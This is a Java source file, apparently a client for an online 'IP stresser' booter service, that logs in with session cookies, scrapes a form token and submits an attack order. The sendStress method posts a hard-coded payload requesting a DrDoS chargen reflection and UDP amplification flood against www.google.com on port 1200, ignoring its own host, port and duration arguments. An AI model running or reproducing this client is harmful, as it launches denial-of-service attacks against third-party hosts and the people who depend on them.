package IPStresser;

import javax.swing.*;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.List;

public class IPStresserManager {
    enum RequestMethod{
        GET,POST
    }

    String sessionCookies;

    public IPStresserManager(JLabel jLabel){
        //System.setProperty("java.net.useSystemProxies", "true");
        // Check if session exists
        sessionCookies = null;
        try {
            sessionCookies = Files.readAllLines(Paths.get("session.txt")).stream().findFirst().get();
        }catch (Exception e){}

        new Thread(() -> {
            if(sessionCookies != null){
                if(!isLoggedIn()) {
                    sessionCookies = getSession();
                }
            }
            else {
                sessionCookies = getSession();
            }
        }).start();

    }

    public void login(String username,String password){
        String loginUrl = "https://www.ipstresser.com/index.php?page=login";
        List<String> headers = Arrays.asList(
                "Origin", "https://www.ipstresser.com",
                "Content-Type", "application/x-www-form-urlencoded",
                "Cookie", sessionCookies,
                "Referer", "https://www.ipstresser.com/index.php?page=login",
                "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "User-Agent", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36");
        String loginPayload = "action=process&username="+username+"&password="+password;
        webRequest(loginUrl, RequestMethod.POST, headers, loginPayload);
    }

    public String getSession(){
        List<String> headers = Arrays.asList("User-Agent", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36",
                "Content-Type", "text/plain; charset=utf-8",
                "Accept", "*/*",
                "Accept-Language", "en-US,en;q=0.8");

        List<String> headerList = getCookies("https://www.ipstresser.com/index.php", RequestMethod.GET, headers, null);
        StringBuilder sb = new StringBuilder();
        for (String cookie : headerList) {
            sb.append(cookie.split(";")[0]);
            sb.append("; ");
        }
        sb.setLength(sb.length() - 2);
        String sessionCookies = sb.toString();
        try {
            Files.write(Paths.get("session.txt"), sessionCookies.getBytes());
        }catch (Exception e){System.out.println("Error writting session file.");}

        return sessionCookies;
    }

    public String getKey(){
        String stresserUrl = "https://www.ipstresser.com/index.php?page=stresser";
        List<String> headers = Arrays.asList(
                "Cookie",sessionCookies,
                "Referer","https://www.ipstresser.com/index.php?page=login",
                "Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "User-Agent","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36");
        String stresserResponse = webRequest(stresserUrl, RequestMethod.GET, headers, null);

        String identifier = "<input type=\"hidden\" name=\"token\" value=\"";
        int startIndex = stresserResponse.indexOf(identifier);
        return stresserResponse.substring(startIndex+identifier.length(),stresserResponse.indexOf("\"",startIndex+identifier.length()));
    }

    public void sendStress(String method, List<String> hosts, int port, int duration, int bandwidth){
        String doStressUrl = "https://www.ipstresser.com/index.php?page=stresser";
        List<String> headers = Arrays.asList(
                "Origin","https://www.ipstresser.com",
                "Content-Type","application/x-www-form-urlencoded",
                "Cookie",sessionCookies,
                "Referer","https://www.ipstresser.com/index.php?page=login",
                "Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "User-Agent","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36");
        String doStressPayload = "action=process&token=" + getKey() +
                "&method=drdos&drdos_protocol=chargen&host1=www.google.com&host2=&host3=&host4=&host5=&host6=&host7=&host8=&host9=&host10=&host11=&host12=&host13=&host14=&host15=&host16=&host17=&host18=&host19=&host20=&host21=&host22=&host23=&host24=&host25=&host26=&host27=&host28=&host29=&host30=&host31=&host32=&port=1200&rudy_path=&parameter=&slowloris_path=&duration=15&bandwidth=800&flood_time=2&recover_time=3&udp_amplification=1&packet_size=4096&slowloris_method=GET&conn_timeout=30&tcp_timeout=5";
        webRequest(doStressUrl, RequestMethod.POST, headers, doStressPayload);
    }

    public boolean isLoggedIn(){
        String doStressUrl = "https://www.ipstresser.com/index.php?page=account";
        List<String> headers = Arrays.asList(
                "Origin","https://www.ipstresser.com",
                "Content-Type","application/x-www-form-urlencoded",
                "Cookie",sessionCookies,
                "Referer","https://www.ipstresser.com/index.php?page=login",
                "Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "User-Agent","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36");

        return getResponseCode(doStressUrl, RequestMethod.GET, headers, null) == 200;
    }



    public List<String> getCookies(String targetURL,RequestMethod requestMethod, List<String> headers, String payload) {
        URL url;
        HttpURLConnection connection = null;
        try {
            // Create connection
            url = new URL(targetURL);
            connection = (HttpURLConnection) url.openConnection();
            if(requestMethod == RequestMethod.GET) connection.setRequestMethod("GET");
            else if(requestMethod == RequestMethod.POST) connection.setRequestMethod("POST");


            for(int i = 0; i < headers.size(); i+=2) {
                connection.setRequestProperty(headers.get(i), headers.get(i + 1));
            }

            connection.setUseCaches(false);
            connection.setDoInput(true);
            connection.setDoOutput(true);

            // Send request
            if(requestMethod == RequestMethod.POST){
                connection.setRequestProperty("Content-Length", Integer.toString(payload.getBytes().length));
                DataOutputStream wr = new DataOutputStream(connection.getOutputStream());
                wr.writeBytes(payload);
                wr.flush();
                wr.close();
            }

            // Get Response
            InputStream is = connection.getInputStream();
            BufferedReader rd = new BufferedReader(new InputStreamReader(is));
            String line;
            StringBuilder response = new StringBuilder();
            while ((line = rd.readLine()) != null) {
                response.append(line);
                response.append('\n');
            }
            rd.close();

            return connection.getHeaderFields().get("Set-Cookie");

        } catch (Exception e) {


            e.printStackTrace();
            return null;

        } finally {

            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    public String webRequest(String targetURL,RequestMethod requestMethod, List<String> headers, String payload) {
        URL url;
        HttpURLConnection connection = null;
        try {
            // Create connection
            url = new URL(targetURL);
            connection = (HttpURLConnection) url.openConnection();
            if(requestMethod == RequestMethod.GET) connection.setRequestMethod("GET");
            else if(requestMethod == RequestMethod.POST) connection.setRequestMethod("POST");


            for(int i = 0; i < headers.size(); i+=2) {
                connection.setRequestProperty(headers.get(i), headers.get(i + 1));
            }

            connection.setUseCaches(false);
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setInstanceFollowRedirects(false);

            // Send request
            if(requestMethod == RequestMethod.POST){
                connection.setRequestProperty("Content-Length", Integer.toString(payload.getBytes().length));
                DataOutputStream wr = new DataOutputStream(connection.getOutputStream());
                wr.writeBytes(payload);
                wr.flush();
                wr.close();
            }

            // Get Response
            InputStream is = connection.getInputStream();
            BufferedReader rd = new BufferedReader(new InputStreamReader(is));
            String line;
            StringBuilder response = new StringBuilder();
            while ((line = rd.readLine()) != null) {
                response.append(line);
                response.append('\n');
            }
            rd.close();

            return response.toString();

        } catch (Exception e) {


            e.printStackTrace();
            return null;

        } finally {

            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    public int getResponseCode(String targetURL,RequestMethod requestMethod, List<String> headers, String payload) {
        URL url;
        HttpURLConnection connection = null;
        try {
            // Create connection
            url = new URL(targetURL);
            connection = (HttpURLConnection) url.openConnection();
            if(requestMethod == RequestMethod.GET) connection.setRequestMethod("GET");
            else if(requestMethod == RequestMethod.POST) connection.setRequestMethod("POST");


            for(int i = 0; i < headers.size(); i+=2) {
                connection.setRequestProperty(headers.get(i), headers.get(i + 1));
            }

            connection.setUseCaches(false);
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setInstanceFollowRedirects(false);

            // Send request
            if(requestMethod == RequestMethod.POST){
                connection.setRequestProperty("Content-Length", Integer.toString(payload.getBytes().length));
                DataOutputStream wr = new DataOutputStream(connection.getOutputStream());
                wr.writeBytes(payload);
                wr.flush();
                wr.close();
            }

            // Get Response
            InputStream is = connection.getInputStream();
            BufferedReader rd = new BufferedReader(new InputStreamReader(is));
            String line;
            StringBuilder response = new StringBuilder();
            while ((line = rd.readLine()) != null) {
                response.append(line);
                response.append('\n');
            }
            rd.close();

            return connection.getResponseCode();

        } catch (Exception e) {


            e.printStackTrace();

        } finally {

            if (connection != null) {
                connection.disconnect();
            }
        }

        return -1;
    }

}
